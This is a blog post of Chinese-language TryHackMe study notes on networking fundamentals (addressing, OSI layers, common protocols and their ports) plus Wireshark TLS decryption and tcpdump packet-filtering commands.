<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>THM笔记 | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="THM笔记部分太过简单就不再记录 Medium上有很多wp，可以借鉴 基础知识IPInternet protocol  网络地址192.168.1.1 主机地址192.168.1.101 默认网关192.168.1.255 向别的网关发送数据    MAC地址Media Access Control 前6个字符代表制造网络接口的公私，后六个字符是一个唯一的数字 LAN连接方式拓扑(Topology">
<meta property="og:type" content="article">
<meta property="og:title" content="THM笔记">
<meta property="og:url" content="http://example.com/2025/03/17/THM%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="DDL&#39;S BLOG">
<meta property="og:description" content="THM笔记部分太过简单就不再记录 Medium上有很多wp，可以借鉴 基础知识IPInternet protocol  网络地址192.168.1.1 主机地址192.168.1.101 默认网关192.168.1.255 向别的网关发送数据    MAC地址Media Access Control 前6个字符代表制造网络接口的公私，后六个字符是一个唯一的数字 LAN连接方式拓扑(Topology">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/img/avatar.png">
<meta property="article:published_time" content="2025-03-17T11:15:33.000Z">
<meta property="article:modified_time" content="2025-03-17T11:16:13.010Z">
<meta property="article:author" content="DDL">
<meta property="article:tag" content="5wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/03/17/THM%E7%AC%94%E8%AE%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'THM笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">THM笔记</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">THM笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-03-17T11:15:33.000Z" title="Created 2025-03-17 19:15:33">2025-03-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-03-17T11:16:13.010Z" title="Updated 2025-03-17 19:16:13">2025-03-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">23.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>90mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="THM笔记"><a href="#THM笔记" class="headerlink" title="THM笔记"></a>THM笔记</h1><p>部分太过简单就不再记录</p>
<p>Medium上有很多wp，可以借鉴</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h3 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h3><p>Internet protocol</p>
<ul>
<li>网络地址192.168.1.1</li>
<li>主机地址192.168.1.101</li>
<li>默认网关192.168.1.255<ul>
<li>向别的网关发送数据</li>
</ul>
</li>
</ul>
<h3 id="MAC地址"><a href="#MAC地址" class="headerlink" title="MAC地址"></a>MAC地址</h3><p>Media Access Control</p>
<p>前6个字符代表制造网络接口的公私，后六个字符是一个唯一的数字</p>
<h3 id="LAN"><a href="#LAN" class="headerlink" title="LAN"></a>LAN</h3><p>连接方式<strong>拓扑(Topology</strong></p>
<ol>
<li>星型<ul>
<li>通过交换机或集线器连接</li>
<li>添加方便，成本高，不适合大规模</li>
</ul>
</li>
<li>总线拓扑<ul>
<li>有主干电缆，</li>
<li>成本低，排查困难</li>
</ul>
</li>
<li>环形拓扑<ul>
<li>一个坏就全完</li>
</ul>
</li>
</ol>
<table>
<thead>
<tr>
<th>特性</th>
<th>集线器（Hub）</th>
<th>交换机（Switch）</th>
<th>中继器（Repeater）</th>
</tr>
</thead>
<tbody><tr>
<td><strong>工作层次</strong></td>
<td>物理层（Layer 1）</td>
<td>数据链路层（Layer 2）</td>
<td>物理层（Layer 1）</td>
</tr>
<tr>
<td><strong>数据传输</strong></td>
<td>广播所有端口</td>
<td>根据 MAC 地址定向转发</td>
<td>放大并转发信号</td>
</tr>
<tr>
<td><strong>带宽</strong></td>
<td>所有端口共享带宽</td>
<td>每个端口独立带宽</td>
<td>无带宽概念，仅用于信号放大</td>
</tr>
<tr>
<td><strong>智能</strong></td>
<td>无智能，仅转发数据</td>
<td>智能转发数据，避免广播</td>
<td>无智能，仅放大信号</td>
</tr>
</tbody></table>
<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p><strong>A</strong>ddress <strong>R</strong>esolution <strong>P</strong>rotocol 地址解析协议</p>
<p>将这两个标识符（IP 地址和 MAC 地址）映射在一起</p>
<p>用来广播IP的所有者来确定mac地址</p>
<h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>(<strong>D</strong>ynamic <strong>H</strong>ost <strong>C</strong>onfiguration <strong>P</strong>rotocol)</p>
<p>动态主机配置协议</p>
<p>询问，请求，确认</p>
<h3 id="七层模型"><a href="#七层模型" class="headerlink" title="七层模型"></a>七层模型</h3><ol>
<li>物理层</li>
<li>数据链路层<ul>
<li>网络层来接收数据，并添加接收端点的物理mac地址</li>
<li>所有联网设备附带的硬件名称是NIC网络接口卡，无法更改</li>
<li>switch</li>
</ul>
</li>
<li>网络层<ul>
<li>能够用IP地址传送数据包</li>
<li>OSPF <strong>（</strong>开放<strong>式</strong>最短<strong>路径</strong>优先<strong>）****和</strong>RIP <strong>（</strong>路由<strong>信息</strong>协议<strong>）</strong></li>
<li>switch</li>
<li>防火墙</li>
</ul>
</li>
<li>传输层<ul>
<li>tcp（Transmission Control Protocol</li>
<li>udp（User Datagram Protocol</li>
<li>防火墙</li>
</ul>
</li>
<li>会话层</li>
<li>表示层<ul>
<li>起连接作用，tanslator</li>
</ul>
</li>
<li>应用层<ul>
<li>用户交互</li>
</ul>
</li>
</ol>
<h3 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h3><ul>
<li>ipsec<ul>
<li>设置困难，加密功能强大</li>
</ul>
</li>
<li>PPTP<strong>点对点****隧道</strong>协议<ul>
<li>设置简单，加密性弱</li>
</ul>
</li>
<li>ppp<ul>
<li><strong>仅</strong>加密并提供数据认证</li>
</ul>
</li>
</ul>
<h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>用nslookup去查看</p>
<ul>
<li>nslookup –type&#x3D;cname xxx</li>
</ul>
<p>DNS在应用层（即 ISO OSI 模型的第 7 层）运行。DNS流量默认使用 UDP 端口 53，TCP 端口 53 作为默认后备。DNS 记录有很多种类型；但是，在本任务中，我们将重点关注以下四种：</p>
<ul>
<li><strong>A 记录</strong>：A（地址）记录将主机名映射到一个或多个 IPv4 地址。例如，您可以设置<code>example.com</code>为解析为<code>172.17.2.172</code>。</li>
<li><strong>AAAA 记录</strong>：AAAA 记录与 A 记录类似，但它适用于 IPv6。请记住，它是 AAAA（四 A），因为 AA 和 AAA 指的是电池大小；此外，AAA 指的是<em>身份验证、授权和记帐</em>；两者都不属于DNS。</li>
<li><strong>CNAME 记录</strong>：CNAME（规范名称）记录将一个域名映射到另一个域名。例如，<code>www.example.com</code>可以映射到<code>example.com</code>，甚至可以映射到<code>example.org</code>。</li>
<li><strong>MX 记录</strong>：MX（邮件交换）记录指定负责处理域电子邮件的邮件服务器。</li>
</ul>
<h4 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h4><p>使用该<code>whois</code>命令查找 WHOIS 记录受隐私保护的域。</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><ul>
<li><strong>应用程序数据</strong>：一切从用户将想要发送的数据输入应用程序开始。例如，您编写电子邮件或即时消息并点击发送按钮。应用程序会格式化这些数据，并根据所使用的应用程序协议使用其下方的层（传输层）开始发送这些数据。</li>
<li><strong>传输协议段或数据报</strong>：传输层（如 TCP 或UDP）添加适当的报头信息并创建TCP <strong>段</strong>（或UDP <strong>数据报</strong>）。该段被发送到其下一层，即网络层。</li>
<li><strong>网络数据包</strong>：网络层，也就是 Internet 层，给收到的 TCP 段或UDP数据报添加一个 IP 报头。然后，这个 IP<strong>数据包</strong>被发送到它下面的层，即数据链路层。</li>
<li><strong>数据链路帧</strong>：以太网或 WiFi 接收 IP 数据包并添加适当的报头和尾部，从而创建<strong>帧</strong>。</li>
</ul>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250106141237565.png?raw=true" alt="image-20250106141237565"></p>
<ul>
<li>应用层发的是数据data</li>
<li>传输层发的是<ul>
<li>tcp协议段segment</li>
<li>udp数据报datagram</li>
</ul>
</li>
<li>网络层的是数据包packet</li>
<li>数据链路层的是数据帧frame</li>
</ul>
<h3 id="网络协议"><a href="#网络协议" class="headerlink" title="网络协议"></a>网络协议</h3><h4 id="DHCP-1"><a href="#DHCP-1" class="headerlink" title="DHCP"></a>DHCP</h4><p>服务器监听UDP端口 67，客户端从UDP端口 68 发送。您的智能手机和笔记本电脑默认配置为使用DHCP 。</p>
<p>DHCP遵循四个步骤：发现、提供、请求和确认 (DORA)：</p>
<ol>
<li><strong>DHCP发现</strong>：客户端将广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。</li>
<li><strong>DHCP提供</strong>：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。</li>
<li><strong>DHCP请求</strong>：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。</li>
<li><strong>DHCP确认</strong>：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。</li>
</ol>
<p>HCP服务器为我们提供以下内容：</p>
<ul>
<li>租用IP地址访问网络资源</li>
<li>将数据包路由到本地网络之外的网关</li>
<li>用于解析域名的DNS服务器（稍后会详细介绍）</li>
</ul>
<h4 id="ARP-1"><a href="#ARP-1" class="headerlink" title="ARP"></a>ARP</h4><p>访问mac地址的</p>
<p>Address Resolution Protocol</p>
<p>通过 ARP 请求和响应，设备能够获得目标主机的物理地址，并通过缓存避免频繁的 ARP 请求。尽管 ARP 协议简单高效，但它也存在一定的安全风险，ARP 欺骗攻击是其中的一个典型问题。</p>
<p>地址解析协议 ( ARP ) 使得在以太网上查找另一台设备的 MAC 地址成为可能，具有 IP 地址的主机<code>192.168.66.89</code>想要与具有 IP 地址的另一个系统进行通信<code>192.168.66.1</code>。它发送ARP请求，要求具有 IP 地址的主机<code>192.168.66.1</code>做出响应。ARP请求从请求者的 MAC 地址发送到广播 MAC 地址，如第一个数据包中所示。ARP答复随后不久到达，具有 IP 地址的主机以其 MAC 地址做出响应。从此时起，两台主机可以交换数据链路层帧。<code>ff:ff:ff:ff:ff:ff``192.168.66.1</code></p>
<h4 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h4><p>Internet Control Message Protocol (ICMP) </p>
<ul>
<li><code>ping</code>：此命令使用 ICMP 测试与目标系统的连接并测量往返时间 (RTT)。换句话说，它可用于了解目标是否处于活动状态以及其回复是否可以到达我们的系统。</li>
<li><code>traceroute``traceroute</code>：此命令在Linux和类 UNIX 系统以及MS Windows 系统上调用<code>tracert</code>。它使用 ICMP 来发现从您的主机到目标的路由。</li>
</ul>
<h4 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h4><ul>
<li><strong>OSPF（开放最短路径优先）</strong>：OSPF 是一种路由协议，允许路由器共享有关网络拓扑的信息并计算最有效的数据传输路径。它通过让路由器交换有关其连接链路和网络状态的更新来实现这一点。这样，每个路由器都有完整的网络地图，并可以确定到达任何目的地的最佳路线。</li>
<li><strong>EIGRP（增强型内部网关路由协议）</strong>：EIGRP 是 Cisco 专有的路由协议，它结合了不同路由算法的各个方面。它允许路由器共享有关它们可以到达的网络以及与这些路由相关的成本（如带宽或延迟）的信息。然后，路由器会使用这些信息来选择最有效的数据传输路径。</li>
<li><strong>BGP（边界网关协议）</strong>：BGP 是互联网上使用的主要路由协议。它允许不同的网络（如互联网服务提供商的网络）交换路由信息并建立数据在这些网络之间传输的路径。BGP 有助于确保数据即使在穿越多个网络时也能在互联网上高效路由。</li>
<li><strong>RIP（路由信息协议）</strong>：RIP 是一种简单的路由协议，通常用于小型网络。运行 RIP 的路由器会共享有关它们可以到达的网络以及到达该网络所需的跳数（路由器）的信息。因此，每个路由器都会根据此信息构建路由表，选择跳数最少的路由到达每个目的地。</li>
</ul>
<h4 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h4><p>背后的理念是使用<strong>一个公有 IP 地址</strong>为<strong>许多私有 IP 地址</strong>提供 Internet 访问。</p>
<p>从笔记本电脑的角度来看，连接是从其 IP 地址<code>192.168.0.129</code>从TCP源端口号发起的<code>15401</code>；但是，Web 服务器将看到此连接是从 TCP 端口号 建立的<code>212.3.4.5</code>，如转换表所示。路由器无缝地执行此地址转换。<code>19273</code></p>
<p>假设路由器具有无限的处理能力，粗略地说，它能够维持65千个<strong>同时</strong>的TCP连接</p>
<h4 id="s-FTP-s"><a href="#s-FTP-s" class="headerlink" title="s&#x2F;FTP&#x2F;s"></a>s&#x2F;FTP&#x2F;s</h4><p>21端口的文本传输协议，990是ftps</p>
<p>在下面的终端中，我们执行了使用本地客户端<code>ftp 10.10.25.157</code>连接到远程FTP服务器的命令<code>ftp</code>。然后我们经历了以下步骤：</p>
<ul>
<li>我们使用用户名<code>anonymous</code>登录</li>
<li>我们不需要提供任何密码</li>
<li>发布<code>ls</code>返回可供下载的文件列表</li>
<li><code>type ascii</code>由于这是一个文本文件，因此切换到 ASCII 模式</li>
<li><code>get coffee.txt</code>允许我们检索我们想要的文件</li>
</ul>
<p>默认连接账户anonymous，密码为空</p>
<h5 id="sftp"><a href="#sftp" class="headerlink" title="sftp"></a>sftp</h5><p>SFTP 代表SSH文件传输协议，允许安全的文件传输。</p>
<h5 id="ftps"><a href="#ftps" class="headerlink" title="ftps"></a>ftps</h5><p>要设置证书，并且由于它使用单独的连接进行控制和数据传输，因此很难通过严格的防火墙。</p>
<h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>22，23端口的远程连接协议</p>
<p>TELNET 服务器监听端口 23，而SSH服务器监听端口 22。</p>
<h4 id="SMTP-s"><a href="#SMTP-s" class="headerlink" title="SMTP&#x2F;s"></a>SMTP&#x2F;s</h4><p>加密之后465+587</p>
<p>未加密25端口</p>
<p>邮件传输协议 ( SMTP ) </p>
<ul>
<li><code>HELO</code>或<code>EHLO</code>发起SMTP会话</li>
<li><code>MAIL FROM</code>指定发件人的电子邮件地址</li>
<li><code>RCPT TO</code>指定收件人的电子邮件地址</li>
<li><code>DATA</code>表示客户端将开始发送电子邮件消息的内容。</li>
<li><code>.</code>单独发送一行，表示结束</li>
</ul>
<h4 id="pop3-s"><a href="#pop3-s" class="headerlink" title="pop3&#x2F;s"></a>pop3&#x2F;s</h4><p>Post Office Protocol version 3 </p>
<p>接收电子邮件监听110端口,加密之后995端口</p>
<p>一些常见的POP3命令是：</p>
<ul>
<li>AUTH  进去第一句命令</li>
<li><code>USER &lt;username&gt;</code>识别用户</li>
<li><code>PASS &lt;password&gt;</code>提供用户密码</li>
<li><code>STAT</code>请求消息数量和总大小</li>
<li><code>LIST</code>列出所有消息及其大小</li>
<li><code>RETR &lt;message_number&gt;</code>检索指定消息</li>
<li><code>DELE &lt;message_number&gt;</code>标记消息以进行删除</li>
<li><code>QUIT</code>结束POP3会话并应用更改，例如删除</li>
</ul>
<h4 id="IMAP-s"><a href="#IMAP-s" class="headerlink" title="IMAP&#x2F;s"></a>IMAP&#x2F;s</h4><p>143&#x2F;993端口；同步邮箱</p>
<p>Internet Message Access Protocol</p>
<p>IMAP协议命令比POP3协议命令复杂一些，下面我们列举几个例子：</p>
<ul>
<li><code>LOGIN &lt;username&gt; &lt;password&gt;</code>验证用户身份</li>
<li><code>SELECT &lt;mailbox&gt;</code>选择要使用的邮箱文件夹</li>
<li><code>FETCH &lt;mail_number&gt; &lt;data_item_name&gt;</code>示例<code>fetch 3 body[]</code>获取消息编号 3、消息头和正文。</li>
<li><code>MOVE &lt;sequence_set&gt; &lt;mailbox&gt;</code>将指定的邮件移至另一个邮箱</li>
<li><code>COPY &lt;sequence_set&gt; &lt;data_item_name&gt;</code>将指定的邮件复制到另一个邮箱</li>
<li><code>LOGOUT</code>登出</li>
</ul>
<h4 id="SSL-TLS"><a href="#SSL-TLS" class="headerlink" title="SSL&#x2F;TLS"></a>SSL&#x2F;TLS</h4><p>安全套接字 SSL (Secure Sockets Layer)</p>
<p>自签证书不应用于确认服务器的真实性</p>
<p>对于需要识别自己的每个服务器（或客户端），第一步都是获取签名的 TLS 证书。通常，服务器管理员会创建证书签名请求 (CSR) 并将其提交给证书颁发机构 (CA)；CA 会验证 CSR 并颁发数字证书。收到（签名的）证书后，可以使用它来向其他人识别服务器（或客户端），其他人可以确认签名的有效性。为了让主机确认签名证书的有效性，需要在主机上安装签名颁发机构的证书。在非数字世界中，这类似于识别各种颁发机构的印章。</p>
<h5 id="wireshark解密"><a href="#wireshark解密" class="headerlink" title="wireshark解密"></a>wireshark解密</h5><ul>
<li>First, after right-clicking anywhere, choose “Protocol Preferences.” From the submenu, select “Transport Layer Security.” Thirdly, click on “Open Transport Layer Security preferences.”</li>
<li>Clicking “Open Transport Layer Security preferences” will show a dialog box. You must click the “Browse” button marked with four to locate the <code>ssl-key.log</code>. You can find it in the <code>Documents</code> directory. Finally, click OK, and Wireshark will show all the TLS decrypted. One of these packets contains login credentials.</li>
</ul>
<h4 id="http-https"><a href="#http-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h4><p>80，8080</p>
<p>443，8443</p>
<p>将域名解析为IP之后</p>
<p>http</p>
<ol>
<li>与目标服务器建立TCP三次握手</li>
<li>使用HTTP协议进行通信；例如，发出HTTP请求，如<code>GET / HTTP/1.1</code></li>
<li>三次挥手（四合一</li>
</ol>
<p>https</p>
<ol>
<li>与目标服务器建立TCP三次握手</li>
<li>建立 TLS 会话<ul>
<li>client hello</li>
<li>server hello</li>
</ul>
</li>
<li>使用HTTP协议进行通信；例如，发出HTTP请求，如<code>GET / HTTP/1.1</code></li>
</ol>
<p>通过提供密钥可以解密</p>
<h3 id="wires-hark"><a href="#wires-hark" class="headerlink" title="wires hark"></a>wires hark</h3><p>要文件MD5值就先拉出来再MD5sun</p>
<h3 id="tcpdump抓包分析"><a href="#tcpdump抓包分析" class="headerlink" title="tcpdump抓包分析"></a>tcpdump抓包分析</h3><p>Tcpdump 工具及其libpcap库是用 C 和 C++ 编写的</p>
<p>在windows上叫wincap</p>
<p>假设您只对与网络打印机或特定游戏服务器交换的 IP 数据包感兴趣。您可以使用主机 IP 或主机 HOSTNAME 轻松地将捕获的数据包限制到此主机。在下面的终端中，我们捕获与 example.com 交换的所有数据包并将其保存到 http.pcap。需要注意的是，捕获数据包需要您以 root 身份登录或使用 sudo。</p>
<ul>
<li>Filtering by Host<ul>
<li>sudo tcpdump host example.com -w http.pcap</li>
</ul>
</li>
<li>Filtering by Host<ul>
<li>sudo tcpdump -i ens5 port 53 -n</li>
</ul>
</li>
<li>Filtering by Protocol<ul>
<li>sudo tcpdump -i ens5 icmp -n</li>
</ul>
</li>
<li></li>
<li></li>
</ul>
<h4 id="三个很方便的逻辑运算符："><a href="#三个很方便的逻辑运算符：" class="headerlink" title="三个很方便的逻辑运算符："></a>三个很方便的逻辑运算符：</h4><p>and：捕获两个条件都为真的数据包。例如，tcpdump host 1.1.1.1 and tcp捕获tcp带有 的流量host 1.1.1.1。<br>or：当任一条件为真时捕获数据包。例如，tcpdump udp or icmp捕获UDP或 ICMP 流量。<br>not：当条件不成立时捕获数据包。例如，捕获除 TCP 段之外的所有数据包；我们期望在结果中tcpdump not tcp找到 UDP、ICMP 和ARP数据包。</p>
<p>Tcpdump 是一款功能丰富的程序，具有许多选项，可用于自定义数据包的打印和显示方式。我们选择涵盖以下五个选项：</p>
<p>-q：快速输出；打印简要的数据包信息<br>-e：打印链接级标题<br>-A：以 ASCII 格式显示数据包数据<br>-xx：以十六进制格式显示数据包数据，简称hex<br>-X：以十六进制和 ASCII 显示数据包头和数据</p>
<h4 id="命令解释"><a href="#命令解释" class="headerlink" title="命令													解释"></a>命令													解释</h4><p>tcpdump -i INTERFACE	捕获特定网络接口上的数据包<br>tcpdump -w FILE	将捕获的数据包写入文件<br>tcpdump -r FILE	从文件读取捕获的数据包<br>tcpdump -c COUNT	捕获特定数量的数据包<br>tcpdump -n	不解析 IP 地址<br>tcpdump -nn	不解析 IP 地址，也不解析协议号<br>tcpdump -v	-vv详细显示；详细程度可以通过和增加-vvv</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>tcpdump host IP</code>或者<code>tcpdump host HOSTNAME</code></td>
<td>按 IP 地址或主机名过滤数据包</td>
</tr>
<tr>
<td><code>tcpdump src host IP</code>或者</td>
<td>根据特定源主机过滤数据包</td>
</tr>
<tr>
<td><code>tcpdump dst host IP</code></td>
<td>根据特定目标主机过滤数据包</td>
</tr>
<tr>
<td><code>tcpdump port PORT_NUMBER</code></td>
<td>按端口号过滤数据包</td>
</tr>
<tr>
<td><code>tcpdump src port PORT_NUMBER</code></td>
<td>按指定源端口号过滤数据包</td>
</tr>
<tr>
<td><code>tcpdump dst port PORT_NUMBER</code></td>
<td>按指定目标端口号过滤数据包</td>
</tr>
<tr>
<td><code>tcpdump PROTOCOL</code></td>
<td>按协议过滤数据包；示例包括<code>ip</code>、<code>ip6</code>和<code>icmp</code></td>
</tr>
</tbody></table>
<h5 id="找mac访问"><a href="#找mac访问" class="headerlink" title="找mac访问"></a>找mac访问</h5><p>tcpdump -r traffic.pcap arp and arp[24:4]&#x3D;0xc0a87c89</p>
<ul>
<li>这个命令的目的是过滤出所有 ARP 数据包，并且只显示目标 IP 地址为 <code>192.168.124.137</code>（即 <code>0xc0a87c89</code>）的 ARP 数据包。</li>
</ul>
<h5 id="找数量"><a href="#找数量" class="headerlink" title="找数量"></a>找数量</h5><p> tcpdump -r traffic.pcap icmp -n | wc</p>
<ul>
<li>输出行数，icmp协议的</li>
</ul>
<h5 id="找第一个出现的域名"><a href="#找第一个出现的域名" class="headerlink" title="找第一个出现的域名"></a>找第一个出现的域名</h5><p>tcpdump -nnr traffic.pcap port 53</p>
<ul>
<li>1</li>
</ul>
<h5 id="检测tcp连接"><a href="#检测tcp连接" class="headerlink" title="检测tcp连接"></a>检测tcp连接</h5><h6 id="检测tcp重置（RST"><a href="#检测tcp重置（RST" class="headerlink" title="检测tcp重置（RST"></a>检测tcp重置（RST</h6><ul>
<li>tcpdump -nnr traffic.pcap “tcp[tcpflags] &#x3D;&#x3D; tcp-rst” |wc -l</li>
</ul>
